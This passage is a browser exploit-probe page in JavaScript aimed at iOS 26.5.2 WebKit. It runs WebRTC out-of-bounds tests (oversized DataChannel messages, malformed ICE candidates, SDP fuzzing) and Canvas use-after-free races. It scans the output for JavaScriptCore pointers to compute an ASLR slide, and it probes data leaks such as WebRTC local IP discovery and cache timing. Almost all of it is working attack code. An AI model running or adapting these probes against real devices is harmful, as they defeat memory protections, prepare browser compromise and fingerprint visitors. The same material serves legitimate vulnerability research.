</style></head><body>
<div class="btns">
  <button onclick="runAll()">▶ Run All</button>

<script>
var JSC_LO=0x180000000,JSC_HI=0x30000000000;
var JSC_TLO=0x198ce6000,JSC_THI=0x1b37db000;
var pb=new ArrayBuffer(8),pf=new Float64Array(pb),pu=new Uint32Array(pb);

function w(s,c){
  var d=document.getElementById('o'),e=document.createElement('span');
  if(c)e.className=c;
  e.textContent=new Date().toTimeString().slice(0,8)+' '+s+'\n';
  d.appendChild(e);d.scrollTop=d.scrollHeight;
}
function ok(s){w('[+] '+s,'g')}
function info(s){w('[*] '+s,'d')}
function warn(s){w('[~] '+s,'a')}
function hit(s){
  w('[!!!] '+s,'r');
  var sl=document.getElementById('slide');
  sl.style.display='block';sl.textContent+='★ '+s+'\n';
}
function clearLog(){
  document.getElementById('o').innerHTML='';
  document.getElementById('slide').style.display='none';
  document.getElementById('slide').textContent='';
}
function copyLog(){
  var text=document.getElementById('o').textContent;
  navigator.clipboard.writeText(text).then(function(){
    var m=document.getElementById('copymsg');m.style.display='inline';
    setTimeout(function(){m.style.display='none';},2000);
  }).catch(function(){
    var ta=document.createElement('textarea');ta.value=text;
    ta.style.cssText='position:fixed;left:-9999px';
    document.body.appendChild(ta);ta.select();document.execCommand('copy');
    document.body.removeChild(ta);
    var m=document.getElementById('copymsg');m.style.display='inline';
    setTimeout(function(){m.style.display='none';},2000);
  });
}
function chk(val,lbl){
  if(typeof val!=='number'||isNaN(val)||!isFinite(val)) return false;
  pf[0]=val;
  var lo=pu[0],hi=pu[1],approx=hi*4294967296+lo;
  if(approx>=JSC_LO&&approx<=JSC_HI){
    hit('PTR ('+lbl+'): 0x'+approx.toString(16));
    if(approx>=JSC_TLO&&approx<=JSC_THI) hit('JSC TEXT! slide~0x'+(approx-JSC_TLO).toString(16));
    return true;
  }
  return false;
}
function chkBuf(buf,lbl){
  if(!buf||buf.byteLength<8) return 0;
  var u32=new Uint32Array(buf),found=0;
  for(var i=0;i<u32.length-1;i+=2){
    var approx=u32[i+1]*4294967296+u32[i];
    if(approx>=JSC_LO&&approx<=JSC_HI){hit('PTR '+lbl+'['+i+']: 0x'+approx.toString(16));found++;}
  }
  return found;
}

// =====================================================
// T1: WebRTC OOB (CVE-2026-64718, Bugzilla 313935)
// Component: WebRTC — OOB access in WebRTC code
// Attack surface: RTCPeerConnection + ICE + SCTP + SRTP
// =====================================================
async function runWebRTCOOB(){
  w('\n=== WebRTC OOB (CVE-2026-64718) ===\n','g');
  info('Bugzilla 313935 — WebRTC OOB access, present in 26.5.2');

  // W1: RTCDataChannel with extreme message sizes
  info('W1: RTCDataChannel extreme messages...');
  try{
    var pc1=new RTCPeerConnection({iceServers:[]});
    var pc2=new RTCPeerConnection({iceServers:[]});

    // Setup ICE
    pc1.onicecandidate=function(e){if(e.candidate)pc2.addIceCandidate(e.candidate).catch(function(){});};
    pc2.onicecandidate=function(e){if(e.candidate)pc1.addIceCandidate(e.candidate).catch(function(){});};

    // Create data channel
    var dc1=pc1.createDataChannel('test',{ordered:false,maxRetransmits:0});
    var dc2Ref=null;

    pc2.ondatachannel=function(e){dc2Ref=e.channel;};

    // Exchange SDP
    var offer=await pc1.createOffer();
    await pc1.setLocalDescription(offer);
    await pc2.setRemoteDescription(offer);
    var answer=await pc2.createAnswer();
    await pc2.setLocalDescription(answer);
    await pc1.setRemoteDescription(answer);

    // Wait for channel to open
    await new Promise(function(resolve){
      dc1.onopen=resolve;
      setTimeout(resolve,3000);
    });

    if(dc1.readyState==='open'){
      ok('DataChannel open');

      // Send extreme messages
      var sizes=[1,100,65535,65536,1024*1024,4*1024*1024];
      for(var si=0;si<sizes.length;si++){
        try{
          var msg=new Uint8Array(sizes[si]);
          // Fill with ptr-like pattern to detect OOB read
          var u32v=new Uint32Array(msg.buffer);
          for(var i=0;i<u32v.length;i++) u32v[i]=0x41414141+si;

          var T=performance.now();
          dc1.send(msg);
          var dt=performance.now()-T;
          ok('send('+sizes[si]+'): '+dt.toFixed(0)+'ms');

          // Check receive side
          if(dc2Ref&&dc2Ref.readyState==='open'){
            dc2Ref.onmessage=function(e){
              if(e.data instanceof ArrayBuffer){
                chkBuf(e.data,'RTCMsg_'+sizes[si]);
              }
            };
          }
        }catch(e){info('send('+sizes[si]+'): '+e.name);}
      }
      await new Promise(function(r){setTimeout(r,500);});
    } else {
      info('DataChannel not open: '+dc1.readyState);
    }
    pc1.close();pc2.close();
  }catch(e){info('W1: '+e.name+': '+e.message.slice(0,60));}

  // W2: SCTP stream ID extremes
  info('\nW2: SCTP stream ID extremes...');
  try{
    var pc3=new RTCPeerConnection({iceServers:[]});
    var extremeStreamIds=[0,1,65534,65535,65536,0xFFFF,0x10000];
    for(var ei=0;ei<extremeStreamIds.length;ei++){
      try{
        var dc=pc3.createDataChannel('ch'+ei,{
          id:extremeStreamIds[ei],
          negotiated:true
        });
        info('SCTP stream id='+extremeStreamIds[ei]+': '+dc.readyState);
      }catch(e){info('SCTP id='+extremeStreamIds[ei]+': '+e.name);}
    }
    pc3.close();
  }catch(e){info('W2: '+e.name);}

  // W3: ICE candidate with extreme values
  info('\nW3: ICE candidate injection...');
  try{
    var pc4=new RTCPeerConnection({iceServers:[]});
    var pc5=new RTCPeerConnection({iceServers:[]});
    pc4.createDataChannel('x');
    var offer2=await pc4.createOffer();
    await pc4.setLocalDescription(offer2);
    await pc5.setRemoteDescription(offer2);

    // Inject malformed ICE candidates
    var malformedCandidates=[
      // OOB port number
      'candidate:1 1 UDP 2130706431 192.168.1.1 99999 typ host',
      // Negative priority
      'candidate:1 1 UDP 4294967295 192.168.1.1 9999 typ host',
      // Huge foundation (string OOB?)
      'candidate:'+('A'.repeat(1024))+' 1 UDP 1 127.0.0.1 1234 typ host',
      // Empty foundation
      'candidate: 1 UDP 1 127.0.0.1 1234 typ host',
      // Overflow component
      'candidate:1 65535 UDP 1 127.0.0.1 1234 typ host',
    ];

    for(var mi=0;mi<malformedCandidates.length;mi++){
      try{
        await pc5.addIceCandidate({
          candidate:malformedCandidates[mi],
          sdpMid:'0',
          sdpMLineIndex:0
        });
        warn('Malformed ICE['+mi+']: accepted!');
      }catch(e){info('ICE['+mi+']: '+e.name);}
    }
    pc4.close();pc5.close();
  }catch(e){info('W3: '+e.name);}

  ok('WebRTC OOB done');
  await new Promise(function(r){setTimeout(r,50);});
}

// =====================================================
// T2: Canvas UAF (CVE-2026-43821, Bugzilla 314867)
// Use-after-free in WebKit Canvas operations
// =====================================================
async function runCanvasUAF(){
  w('\n=== Canvas UAF (CVE-2026-43821) ===\n','g');
  info('Bugzilla 314867 — WebKit Canvas UAF, present in 26.5.2');

  // CU1: Rapid canvas creation/destruction while drawing
  info('CU1: Canvas create/destroy during draw operations...');
  var leaks=[];
  for(var i=0;i<50;i++){
    try{
      var canvas=document.createElement('canvas');
      canvas.width=256;canvas.height=256;
      var ctx=canvas.getContext('2d');

      // Start drawing operations
      ctx.fillStyle='rgba(222,173,190,0.5)';
      ctx.fillRect(0,0,256,256);
      ctx.beginPath();
      ctx.arc(128,128,128,0,Math.PI*2);
      ctx.fill();

      // Get ImageData WHILE draw is potentially in flight
      var imgData=ctx.getImageData(0,0,256,256);

      // Now destroy canvas by removing all references
      ctx=null;
      canvas.width=0;canvas.height=0; // forces reallocation

      // Check the (now potentially freed) imgData
      var u32=new Uint32Array(imgData.data.buffer);
      var ptrs=0;
      for(var pi=0;pi<u32.length-1;pi+=2){
        var approx=u32[pi+1]*4294967296+u32[pi];
        if(approx>=JSC_LO&&approx<=JSC_HI){hit('Canvas UAF['+i+']: PTR in freed imageData!');ptrs++;}
      }
      if(ptrs>0) leaks.push({iter:i,ptrs:ptrs});

      // Check if non-black/transparent pixels appeared
      var unexpected=0;
      for(var di=0;di<u32.length;di++){
        var v=u32[di];
        if(v!==0&&v!==0xFF000000&&v!==0xBEADDE00){
          unexpected++;
        }
      }
      if(unexpected>1000) warn('Canvas UAF['+i+']: '+unexpected+' unexpected pixels');

      canvas=null;
    }catch(e){}
  }
  ok('CU1: '+leaks.length+'/50 had ptrs');

  // CU2: OffscreenCanvas transfer race
  info('\nCU2: OffscreenCanvas transfer UAF...');
  try{
    for(var j=0;j<30;j++){
      var oc=new OffscreenCanvas(256,256);
      var octx=oc.getContext('2d');
      octx.fillStyle='red';
      octx.fillRect(0,0,256,256);

      // Get image data before transfer
      var imgBefore=octx.getImageData(0,0,256,256);

      // Transfer OffscreenCanvas to worker (detaches it)
      // We can't easily do worker here, but we can use
      // createImageBitmap on the transferring canvas
      var bitmap=await createImageBitmap(oc);

      // The octx should now be invalid (transferred)
      try{
        // Try to use octx after bitmap creation (UAF?)
        octx.fillStyle='blue';
        octx.fillRect(0,0,128,128);
        var imgAfter=octx.getImageData(0,0,256,256);
        var u32a=new Uint32Array(imgAfter.data.buffer);
        var ptrs2=0;
        for(var pi2=0;pi2<u32a.length-1;pi2+=2){
          var approx2=u32a[pi2+1]*4294967296+u32a[pi2];
          if(approx2>=JSC_LO&&approx2<=JSC_HI){hit('OffscreenCanvas UAF['+j+']: PTR!');ptrs2++;}
        }
        if(ptrs2===0&&imgAfter.data[0]!==0){
          // Canvas still accessible — not UAF but maybe data leak
          var blueFound=0;
          for(var k=0;k<u32a.length;k++) if(u32a[k]===0xFF0000FF||u32a[k]===0xFFFF0000) blueFound++;
        }
      }catch(e){info('After transfer octx use: '+e.name);}
      bitmap.close();
    }
  }catch(e){info('CU2: '+e.name);}

  // CU3: Canvas context 2D image pattern UAF
  info('\nCU3: Canvas pattern from freed image...');
  try{
    for(var k=0;k<20;k++){
      var srcCanvas=document.createElement('canvas');
      srcCanvas.width=64;srcCanvas.height=64;
      var srcCtx=srcCanvas.getContext('2d');
      srcCtx.fillStyle='rgb(222,173,190)';
      srcCtx.fillRect(0,0,64,64);

      // Create pattern FROM srcCanvas
      var dstCanvas=document.createElement('canvas');
      dstCanvas.width=256;dstCanvas.height=256;
      var dstCtx=dstCanvas.getContext('2d');
      var pattern=dstCtx.createPattern(srcCanvas,'repeat');

      // Destroy srcCanvas while pattern holds reference
      srcCanvas.width=0;srcCanvas.height=0;
      srcCtx=null;srcCanvas=null;

      // Use the pattern (UAF: pattern references freed canvas data)
      dstCtx.fillStyle=pattern;
      dstCtx.fillRect(0,0,256,256);

      var img=dstCtx.getImageData(0,0,256,256);
      var u32p=new Uint32Array(img.data.buffer);
      var ptrs3=chkBuf(img.data.buffer,'CanvasPattern_'+k);
      if(ptrs3>0) hit('Canvas pattern UAF['+k+']: PTR in pattern output!');

      // Check for non-pattern values (freed heap content)
      var nonPattern=u32p.filter(function(v){return v!==0&&v!==0xBEADDE00&&v!==0xFF000000;}).length;
      if(nonPattern>0&&k<3) info('CU3['+k+']: '+nonPattern+' non-pattern pixels');

      dstCanvas=null;pattern=null;
    }
    ok('CU3 done');
  }catch(e){info('CU3: '+e.name);}

  ok('Canvas UAF done');
  await new Promise(function(r){setTimeout(r,50);});
}

// =====================================================
// T3: Data Leak (CVE-2026-64778)
// "Visiting a maliciously crafted website may leak sensitive data"
// Probe various info disclosure channels
// =====================================================
async function runDataLeak(){
  w('\n=== Data Leak Probe (CVE-2026-64778) ===\n','g');
  info('CVE-2026-64778: website may leak sensitive data');
  info('Probing: navigation timing, performance, storage info');

  // DL1: Navigation timing
  info('DL1: Navigation timing precision...');
  try{
    var nt=performance.getEntriesByType('navigation')[0];
    if(nt){
      var times=['startTime','redirectStart','redirectEnd','fetchStart',
                  'domainLookupStart','domainLookupEnd','connectStart',
                  'secureConnectionStart','connectEnd','requestStart',
                  'responseStart','responseEnd','domInteractive',
                  'domContentLoadedEventStart','domContentLoadedEventEnd',
                  'domComplete','loadEventStart','loadEventEnd'];
      for(var ti=0;ti<times.length;ti++){
        var v=nt[times[ti]];
        if(v!==0) info(times[ti]+': '+v.toFixed(3));
        chk(v,'NavTiming_'+times[ti]);
      }
    }
  }catch(e){info('DL1: '+e.name);}

  // DL2: Storage quota estimates
  info('\nDL2: Storage quota estimates...');
  try{
    var est=await navigator.storage.estimate();
    ok('Storage estimate: usage='+est.usage+' quota='+est.quota);
    chk(est.usage,'StorageUsage');chk(est.quota,'StorageQuota');
  }catch(e){info('DL2: '+e.name);}

  // DL3: Cross-origin iframe timing oracle
  info('\nDL3: Same-site cookie leak via timing...');
  try{
    // Check if cache timing exposes visited links
    var urlsToCheck=['https://apple.com','https://google.com'];
    for(var ui=0;ui<urlsToCheck.length;ui++){
      var T=performance.now();
      try{
        var resp=await fetch(urlsToCheck[ui],{mode:'no-cors',cache:'force-cache'});
        var dt=performance.now()-T;
        info('fetch('+urlsToCheck[ui].slice(8,20)+'): '+dt.toFixed(0)+'ms — cache hint');
        chk(dt,'FetchTiming_'+ui);
      }catch(e){info('fetch('+urlsToCheck[ui].slice(8,20)+'): '+e.name);}
    }
  }catch(e){info('DL3: '+e.name);}

  // DL4: WebRTC IP leak
  info('\nDL4: WebRTC local IP discovery...');
  try{
    var pc=new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('x');
    var offer=await pc.createOffer();
    await pc.setLocalDescription(offer);
    var candidates=[];
    await new Promise(function(resolve){
      pc.onicecandidate=function(e){
        if(e.candidate){
          var parts=e.candidate.candidate.split(' ');
          if(parts[7]==='host') candidates.push(parts[4]);
        } else resolve();
      };
      setTimeout(resolve,2000);
    });
    ok('Local IPs via WebRTC: '+candidates.join(', '));
    pc.close();
  }catch(e){info('DL4: '+e.name);}

  // DL5: Performance memory (if available)
  info('\nDL5: performance.memory...');
  if(performance.memory){
    ok('jsHeapSizeLimit: '+performance.memory.jsHeapSizeLimit);
    ok('totalJSHeapSize: '+performance.memory.totalJSHeapSize);
    ok('usedJSHeapSize: '+performance.memory.usedJSHeapSize);
    chk(performance.memory.usedJSHeapSize,'JSHeapUsed');
    chk(performance.memory.totalJSHeapSize,'JSHeapTotal');
  } else info('performance.memory not available');

  ok('Data leak probe done');
  await new Promise(function(r){setTimeout(r,50);});
}

// =====================================================
// T4: SDP extremes — target the WebRTC OOB
// The OOB is in WebRTC parsing of SDP or ICE data
// Fuzz SDP with extreme values
// =====================================================
async function runWebRTCSDP(){
  w('\n=== SDP Extreme Fuzzing ===\n','g');
  info('Fuzzing SDP to trigger WebRTC OOB (Bugzilla 313935)');

  // Build malformed SDP
  var baseSDP='v=0\r\n'+
    'o=- 123456789 123456789 IN IP4 127.0.0.1\r\n'+
    's=-\r\n'+
    't=0 0\r\n'+
    'a=group:BUNDLE 0\r\n'+
    'm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n'+
    'c=IN IP4 0.0.0.0\r\n'+
    'a=ice-ufrag:abcd\r\n'+
    'a=ice-pwd:abcdefghijklmnopqrstuvwx\r\n'+
    'a=fingerprint:sha-256 AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99\r\n'+
    'a=setup:actpass\r\n'+
    'a=mid:0\r\n'+
    'a=sctp-port:5000\r\n'+
    'a=max-message-size:262144\r\n';

  // SDP variant tests
  var sdpTests=[
    {name:'extreme sctp-port',        mod:function(s){return s.replace('5000','99999');}},
    {name:'huge max-message-size',     mod:function(s){return s.replace('262144','4294967295');}},
    {name:'negative max-msg-size',     mod:function(s){return s.replace('262144','-1');}},
    {name:'overflow max-msg-size',     mod:function(s){return s.replace('262144','18446744073709551615');}},
    {name:'long ice-ufrag',            mod:function(s){return s.replace('abcd','a'.repeat(65535));}},
    {name:'long ice-pwd',              mod:function(s){return s.replace('abcdefghijklmnopqrstuvwx','a'.repeat(65535));}},
    {name:'NaN max-message-size',      mod:function(s){return s.replace('262144','NaN');}},
    {name:'extra media sections ×100', mod:function(s){
      var extra='m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\nc=IN IP4 0.0.0.0\r\na=mid:X\r\n';
      return s+extra.repeat(100);
    }},
  ];

  for(var ti=0;ti<sdpTests.length;ti++){
    var t=sdpTests[ti];
    try{
      var pc6=new RTCPeerConnection({iceServers:[]});
      var pc7=new RTCPeerConnection({iceServers:[]});
      pc6.createDataChannel('x');

      var offer3=await pc6.createOffer();
      // Inject modified SDP
      var modifiedSDP=t.mod(offer3.sdp);

      try{
        await pc6.setLocalDescription({type:'offer',sdp:modifiedSDP});
        await pc7.setRemoteDescription({type:'offer',sdp:modifiedSDP});
        ok('SDP['+t.name+']: setRemoteDescription accepted!');
        // Try to get answer
        var ans=await pc7.createAnswer();
        await pc7.setLocalDescription(ans);
        ok('  → answer created');
      }catch(e){
        info('SDP['+t.name+']: '+e.name+': '+e.message.slice(0,50));
      }
      pc6.close();pc7.close();
    }catch(e){info('SDP['+t.name+']: outer '+e.name);}
    await new Promise(function(r){setTimeout(r,100);});
  }
  ok('SDP fuzzing done. Check Analytics.');
}

async function runAll(){
  clearLog();
  w('=== WebRTC OOB + Canvas UAF + Data Leak ===\n','g');
  w('[*] CVE-2026-64718 (WebRTC) + CVE-2026-43821 (Canvas) + CVE-2026-64778\n','d');
  w('[*] All present in iOS 26.5.2, fixed in 26.6\n','d');
  await runWebRTCOOB();
  await runCanvasUAF();
  await runDataLeak();
  await runWebRTCSDP();
  w('\nDone. Check Analytics.\n','g');
}
